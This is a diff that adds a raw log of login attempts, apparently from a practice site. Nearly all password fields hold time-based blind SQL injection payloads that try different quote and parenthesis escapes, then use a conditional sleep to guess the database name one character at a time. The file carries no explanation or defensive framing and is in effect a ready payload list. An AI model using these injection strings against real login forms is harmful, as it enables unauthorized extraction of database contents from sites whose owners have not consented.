@@ -1,0 +1,66 @@
+User Name:fef
+Password:1'
+User Name:geeg
+Password:1"
+User Name:gegege
+Password:1" or if(ascii(database(),1,1)=115,sleep(5),1)-- ' 
+User Name:gege
+Password:1') or if(ascii(database(),1,1)=115,sleep(5),1)-- ' 
+User Name:gege
+Password:1") or if(ascii(database(),1,1)=115,sleep(5),1)-- ' 
+User Name:rgr
+Password:1" or if(ascii(database(),1,1)=115,sleep(5),1)-- ' 
+User Name:gege
+Password:1" or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:gege
+Password:1") or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:gege
+Password:1') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:gege
+Password:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:依恋测试了
+Password:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:依恋测试了
+Password:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:依恋测试了
+Password:1“ or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- ' 
+User Name:依恋测试了
+Password:1‘) or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1" or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1'' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1") or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1'') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1")) or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1'')) or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1) or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试了
+Password:1'") or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- 
+User Name:gege
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- 
+User Name:依恋测试13了
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- 
+User Name:gege
+Password:ge1"') or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- 
+User Name:依恋测试13了
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- 
+User Name:依恋测试了
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- 
+User Name:依恋测试13了
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- 
+User Name:依恋测试13了
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试13了
+Password:1') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:依恋测试13了
+Password:1") or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gegeeg
+Password:1"') or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:gegeeg
+Password:1"') or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
